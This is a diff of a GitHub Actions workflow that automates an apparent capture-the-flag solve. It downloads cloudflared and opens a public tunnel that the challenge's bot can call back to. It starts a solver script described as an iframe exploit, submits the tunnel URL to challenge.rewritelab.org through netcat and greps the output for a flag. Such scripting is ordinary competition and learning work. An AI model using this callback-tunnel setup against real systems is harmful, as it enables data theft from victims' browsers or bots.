@@ -10,10 +10,10 @@ on:
 jobs:
   solve:
     runs-on: ubuntu-latest
-    timeout-minutes: 25
+    timeout-minutes: 8
     steps:
       - uses: actions/checkout@v4
-      - name: Warm exploit runner and await live access point
+      - name: Execute intended iframe exploit against live instance
         shell: bash
         run: |
           set -euo pipefail
@@ -21,58 +21,34 @@ jobs:
           sudo apt-get install -y -qq netcat-openbsd
           wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O /tmp/cloudflared
           chmod +x /tmp/cloudflared
-
-          # Bring up the public tunnel before the live instance exists.
-          python3 -m http.server 8000 --bind 127.0.0.1 >/tmp/dummy.log 2>&1 &
-          DUMMY=$!
-          /tmp/cloudflared tunnel --no-autoupdate --url http://127.0.0.1:8000 >/tmp/cf.log 2>&1 &
-          CF=$!
+          python3 -m http.server 8000 --bind 127.0.0.1 >/tmp/dummy.log 2>&1 & DUMMY=$!
+          /tmp/cloudflared tunnel --no-autoupdate --url http://127.0.0.1:8000 >/tmp/cf.log 2>&1 & CF=$!
           URL=''
-          for i in $(seq 1 90); do
+          for i in $(seq 1 60); do
             URL=$(grep -oE 'https://[-a-z0-9]+\.trycloudflare.com' /tmp/cf.log | head -n1 || true)
             [ -n "$URL" ] && break
             sleep 1
           done
           test -n "$URL"
-          echo "READY_TUNNEL=$URL"
+          echo "TUNNEL=$URL"
           kill "$DUMMY" || true
           sleep 1
-          python3 ctf/chronostasis_live.py "$URL" >/tmp/solver.log 2>&1 &
-          SOLVER=$!
-
-          echo 'READY_FOR_ACCESS_POINT'
-          AP=''
-          for i in $(seq 1 1200); do
-            AP=$(curl -fsSL "https://raw.githubusercontent.com/karollooool/karollooool/main/ctf/live_ap.txt?cb=$(date +%s%N)" 2>/dev/null || true)
-            if echo "$AP" | grep -q '^TCP='; then break; fi
-            sleep 1
-          done
-          echo "ACCESS_CONFIG=$AP"
-          TCP=$(printf '%s\n' "$AP" | sed -n 's/^TCP=//p' | head -1)
-          HTTP=$(printf '%s\n' "$AP" | sed -n 's/^HTTP=//p' | head -1)
-          test -n "$TCP"
-          if [ -n "$HTTP" ]; then
-            echo "HTTP probe: $HTTP"
-            curl -sS --max-time 3 "http://challenge.rewritelab.org:$HTTP/" -D - -o /tmp/http-body || true
-          fi
-
-          # Submit immediately. Retry once if the first bot run races before the
-          # tunnel/iframe target is fully settled; /start resets server state.
-          for attempt in 1 2; do
+          python3 ctf/chronostasis_live.py "$URL" >/tmp/solver.log 2>&1 & SOLVER=$!
+          sleep 2
+          for attempt in 1 2 3; do
             echo "===== BOT OUTPUT attempt $attempt ====="
             set +e
-            OUT=$(printf '%s\n' "$URL/start?t=live" | timeout 30 nc challenge.rewritelab.org "$TCP" 2>&1)
+            OUT=$(printf '%s\n' "$URL/start?t=live" | timeout 30 nc challenge.rewritelab.org 35470 2>&1)
             RC=$?
             set -e
             printf '%s\n' "$OUT"
             echo "nc_rc=$RC"
             if printf '%s\n' "$OUT" | grep -E 'FLAG=rewrite\{[^}]+\}|rewrite\{[^}]+\}'; then
-              echo 'FLAG_FOUND'
+              echo FLAG_FOUND
               break
             fi
             sleep 1
           done
-
           echo '===== SOLVER OUTPUT ====='
           cat /tmp/solver.log
           kill "$SOLVER" "$CF" || true
